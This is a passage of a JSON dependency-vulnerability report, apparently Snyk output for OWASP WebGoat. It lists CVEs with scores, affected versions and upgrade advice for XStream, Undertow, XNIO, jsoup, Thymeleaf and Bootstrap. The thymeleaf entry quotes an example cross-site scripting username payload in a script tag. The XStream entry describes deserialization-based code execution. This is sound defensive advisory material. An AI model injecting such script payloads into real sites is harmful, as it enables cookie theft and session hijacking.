      "disclosureTime": "2017-04-29T19:59:00Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/XStream.java",
            "className": "XStream",
            "functionName": "fromXML"
          },
          "version": [
            "[,1.4.9)"
          ]
        }
      ],
      "fixedIn": [
        "1.4.10"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-31394",
      "identifiers": {
        "CWE": [
          "CWE-20"
        ],
        "GHSA": [
          "GHSA-7hwc-46rm-65jh"
        ],
        "CVE": [
          "CVE-2017-7957"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:41:22.188914Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-05-21T07:52:36Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/6e546ec366419158b1e393211be6d78ab9604ab"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/8542d02d9ac5d384c85f4b33d6c1888c53bd55d"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/b3570be2f39234e61f99f9a20640756ea71b1b4"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-7957"
        },
        {
          "title": "Vendor Advisory",
          "url": "http://x-stream.github.io/CVE-2017-7957.html"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-01-03T16:30:32.214943Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-09-01T15:00:43.379034Z"
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.XStream",
            "functionName": "fromXML"
          },
          "version": [
            "[,1.4.9)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.4.10)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.10"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N/E:F/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-09-04T13:59:15.268423Z",
      "credit": [
        "Dinis Cruz"
      ],
      "cvssScore": 4.8,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Insecure XML deserialization. It could deserialize arbitrary user-supplied XML content, representing objects of any type. A remote attacker able to pass XML to XStream could use this flaw to perform a variety of attacks, including remote code execution in the context of the server running the XStream application.\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.7, 1.4.11 or higher.\n## References\n- [Dinis Cruz Blog](http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html)\n- [Exploit DB](https://www.exploit-db.com/exploits/39193)\n- [Fisheye](https://fisheye.codehaus.org/changelog/xstream?cs=2210)\n- [GitHub Commit](https://github.com/x-stream/xstream/commit/6344867dce6767af7d0fe34fb393271a6456672d)\n- [Redhat Bugzilla](https://bugzilla.redhat.com/CVE-2013-7285)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1051277)\n",
      "disclosureTime": "2013-12-22T16:22:18Z",
      "exploit": "Functional",
      "functions": [
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/mapper/CachingMapper.java",
            "className": "CachingMapper",
            "functionName": "realClass"
          },
          "version": [
            "[1.1.1,1.4.7)"
          ]
        },
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/XStream.java",
            "className": "XStream",
            "functionName": "unmarshal"
          },
          "version": [
            "[1.4.10,1.4.11)"
          ]
        }
      ],
      "fixedIn": [
        "1.4.7",
        "1.4.11"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-460764",
      "identifiers": {
        "CWE": [
          "CWE-94"
        ],
        "CVE": [
          "CVE-2013-7285"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-06-15T04:10:01.436705Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-12-25T16:51:50Z",
      "references": [
        {
          "title": "Dinis Cruz Blog",
          "url": "http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html"
        },
        {
          "title": "Exploit DB",
          "url": "https://www.exploit-db.com/exploits/39193"
        },
        {
          "title": "Fisheye",
          "url": "https://fisheye.codehaus.org/changelog/xstream?cs=2210"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/6344867dce6767af7d0fe34fb393271a6456672d"
        },
        {
          "title": "Redhat Bugzilla",
          "url": "https://bugzilla.redhat.com/CVE-2013-7285"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1051277"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Insecure XML deserialization",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "RHEL",
          "cvssV3Vector": null,
          "cvssV3BaseScore": null,
          "severity": "medium",
          "modificationTime": "2022-09-01T20:02:51.428424Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "severity": "critical",
          "modificationTime": "2022-04-26T01:10:24.113075Z"
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.mapper.CachingMapper",
            "functionName": "realClass"
          },
          "version": [
            "[1.1.1,1.4.7)"
          ]
        },
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.XStream",
            "functionName": "unmarshal"
          },
          "version": [
            "[1.4.10,1.4.11)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.4.7)",
          "[1.4.10,1.4.11)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2022-06-15T13:53:50.957525Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[io.undertow:undertow-core](https://mvnrepository.com/artifact/io.undertow/undertow-core) is a Java web server based on non-blocking IO.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when a `POST` request comes through `AJP` and the request exceeds the `max-post-size` limit (`maxEntitySize`). The `AjpServerRequestConduit` implementation closes a connection without sending any response to the `client/proxy` which will result in a front-end proxy marking the backend worker as an error state and not forward requests to the worker for a while.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `io.undertow:undertow-core` to version 2.2.19.Final, 2.3.0.Alpha2 or higher.\n## References\n- [GitHub Commit](https://github.com/undertow-io/undertow/commit/7d3a045da0fa4e4f3f6c4af145b87c7c15581748)\n- [GitHub Commit](https://github.com/undertow-io/undertow/pull/1350/commits/2825b026d767f28ddbbeb7abec510c6cec2f5a54)\n- [GitHub PR](https://github.com/undertow-io/undertow/pull/1350)\n- [Red Hat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2095862)\n- [Undertow Issue](https://issues.redhat.com/browse/UNDERTOW-2133)\n",
      "disclosureTime": "2022-06-14T00:00:00Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "2.2.19.Final",
        "2.3.0.Alpha2"
      ],
      "id": "SNYK-JAVA-IOUNDERTOW-2871356",
      "identifiers": {
        "CWE": [
          "CWE-400"
        ],
        "CVE": [
          "CVE-2022-2053"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-09-07T11:58:03.312841Z",
      "moduleName": "io.undertow:undertow-core",
      "packageManager": "maven",
      "packageName": "io.undertow:undertow-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-06-15T15:07:37Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/undertow-io/undertow/commit/7d3a045da0fa4e4f3f6c4af145b87c7c15581748"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/undertow-io/undertow/pull/1350/commits/2825b026d767f28ddbbeb7abec510c6cec2f5a54"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/undertow-io/undertow/pull/1350"
        },
        {
          "title": "Red Hat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2095862"
        },
        {
          "title": "Undertow Issue",
          "url": "https://issues.redhat.com/browse/UNDERTOW-2133"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-08-12T01:11:06.068477Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,2.2.19.Final)",
          "[2.3.0.Alpha1,2.3.0.Alpha2)"
        ]
      },
      "mavenModuleName": {
        "groupId": "io.undertow",
        "artifactId": "undertow-core"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-undertow@2.7.1",
        "io.undertow:undertow-core@2.2.18.Final"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-undertow@2.7.3",
        "io.undertow:undertow-core@2.2.19.Final"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "io.undertow:undertow-core",
      "version": "2.2.18.Final"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2022-08-28T06:46:31.563692Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[org.jboss.xnio:xnio-api](https://mvnrepository.com/artifact/org.jboss.xnio/xnio-api) is a simplified low-level I/O layer which can be used anywhere you are using NIO.\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling via the `notifyReadClosed` method by allowing an attacker to send flawed requests to a server, possibly causing log contention-related performance concerns or an unwanted disk fill-up.\n## Remediation\nUpgrade `org.jboss.xnio:xnio-api` to version 3.8.8 or higher.\n## References\n- [GitHub Commit](https://github.com/xnio/xnio/commit/fdefb3b8b715d33387cadc4d48991fb1989b0c12)\n- [GitHub PR](https://github.com/xnio/xnio/pull/291)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2064226)\n",
      "disclosureTime": "2022-08-28T06:35:33Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "3.8.8"
      ],
      "id": "SNYK-JAVA-ORGJBOSSXNIO-2994360",
      "identifiers": {
        "CWE": [
          "CWE-770"
        ],
        "GHSA": [
          "GHSA-76fg-mhrg-fmmg"
        ],
        "CVE": [
          "CVE-2022-0084"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-09-18T13:12:22.790473Z",
      "moduleName": "org.jboss.xnio:xnio-api",
      "packageManager": "maven",
      "packageName": "org.jboss.xnio:xnio-api",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-08-28T09:48:11Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/xnio/xnio/commit/fdefb3b8b715d33387cadc4d48991fb1989b0c12"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/xnio/xnio/pull/291"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2064226"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Allocation of Resources Without Limits or Throttling",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-09-02T01:11:44.401821Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,3.8.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.jboss.xnio",
        "artifactId": "xnio-api"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-undertow@2.7.1",
        "io.undertow:undertow-core@2.2.18.Final",
        "org.jboss.xnio:xnio-api@3.8.7.Final"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.jboss.xnio:xnio-api",
      "version": "3.8.7.Final"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2022-08-24T10:18:19.152230Z",
      "credit": [
        "Jens Häderer"
      ],
      "cvssScore": 4.2,
      "description": "## Overview\n[org.jsoup:jsoup](https://mvnrepository.com/artifact/org.jsoup/jsoup) is a Java library for working with real-world HTML. It provides a very convenient API for extracting and manipulating data, using the best of DOM, CSS, and jquery-like methods. jsoup implements the WHATWG HTML5 specification, and parses HTML to the same DOM as modern browsers do.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper sanitization of `HTML` including `javascript: URL` expressions if the non-default `SafeList.preserveRelativeLinks` option is enabled and no Content Security Policy is set on the website.\r\n\r\n**Note:** Users that are upgrading to the fixed version should also clean old content again because unsanitized input may have persisted.\r\n\r\n## Mitigation\r\n\r\nUsers unable to upgrade to the fixed version should disable the `SafeList.preserveRelativeLinks` option, which will rewrite input URLs as absolute URLs and ensure an appropriate Content Security Policy is defined. It could be also used should as a defense-in-depth best practice.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.jsoup:jsoup` to version 1.15.3 or higher.\n## References\n- [GitHub Commit](https://github.com/jhy/jsoup/commit/4ea768d96b3d232e63edef9594766d44597b3882)\n- [GitHub Release](https://github.com/jhy/jsoup/releases/tag/jsoup-1.15.3)\n",
      "disclosureTime": "2022-08-24T09:57:09Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "1.15.3"
      ],
      "id": "SNYK-JAVA-ORGJSOUP-2989728",
      "identifiers": {
        "CWE": [
          "CWE-79"
        ],
        "CVE": [
          "CVE-2022-36033"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-08-24T10:27:23.184695Z",
      "moduleName": "org.jsoup:jsoup",
      "packageManager": "maven",
      "packageName": "org.jsoup:jsoup",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-08-24T10:27:23.182514Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/jhy/jsoup/commit/4ea768d96b3d232e63edef9594766d44597b3882"
        },
        {
          "title": "GitHub Release",
          "url": "https://github.com/jhy/jsoup/releases/tag/jsoup-1.15.3"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-09-02T01:11:51.362061Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-09-15T17:38:09.209761Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.15.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.jsoup",
        "artifactId": "jsoup"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.jsoup:jsoup@1.14.3"
      ],
      "upgradePath": [
        false,
        "org.jsoup:jsoup@1.15.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.jsoup:jsoup",
      "version": "1.14.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2020-06-14T12:54:59.278366Z",
      "credit": [
        "zeko868"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.thymeleaf.extras:thymeleaf-extras-springsecurity5](https://search.maven.org/artifact/org.thymeleaf.extras/thymeleaf-extras-springsecurity5) is a Modern server-side Java template engine for both web and standalone environments.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) when creating a user with username `<script type=\"text/javascript>alert(\"\");</script> `.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.thymeleaf.extras:thymeleaf-extras-springsecurity5` to version 3.1.0.M1 or higher.\n## References\n- [GitHub Commit](https://github.com/thymeleaf/thymeleaf-extras-springsecurity/pull/75/commits/1b001a1d6e717dab6e864ed8338835909536b665)\n- [GitHub Issue](https://github.com/thymeleaf/thymeleaf-extras-springsecurity/issues/69)\n- [GitHub PR](https://github.com/thymeleaf/thymeleaf-extras-springsecurity/pull/75)\n",
      "disclosureTime": "2020-06-14T12:40:12Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "3.1.0.M1"
      ],
      "id": "SNYK-JAVA-ORGTHYMELEAFEXTRAS-572299",
      "identifiers": {
        "CWE": [
          "CWE-79"
        ],
        "CVE": []
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-01-20T10:34:35.229325Z",
      "moduleName": "org.thymeleaf.extras:thymeleaf-extras-springsecurity5",
      "packageManager": "maven",
      "packageName": "org.thymeleaf.extras:thymeleaf-extras-springsecurity5",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-08-12T10:53:16Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/thymeleaf/thymeleaf-extras-springsecurity/pull/75/commits/1b001a1d6e717dab6e864ed8338835909536b665"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/thymeleaf/thymeleaf-extras-springsecurity/issues/69"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/thymeleaf/thymeleaf-extras-springsecurity/pull/75"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,3.1.0.M1)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.thymeleaf.extras",
        "artifactId": "thymeleaf-extras-springsecurity5"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.thymeleaf.extras:thymeleaf-extras-springsecurity5@3.0.4.RELEASE"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.thymeleaf.extras:thymeleaf-extras-springsecurity5",
      "version": "3.0.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-06-28T12:11:08.918250Z",
      "credit": [
        "Yonatan Offek (poiu)"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) in` data-template`, `data-content ` and `data-title` properties of tooltip/popover.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.1, 4.3.1 or higher.\n## References\n- [Bootstrap Blog](https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/)\n- [GitHub 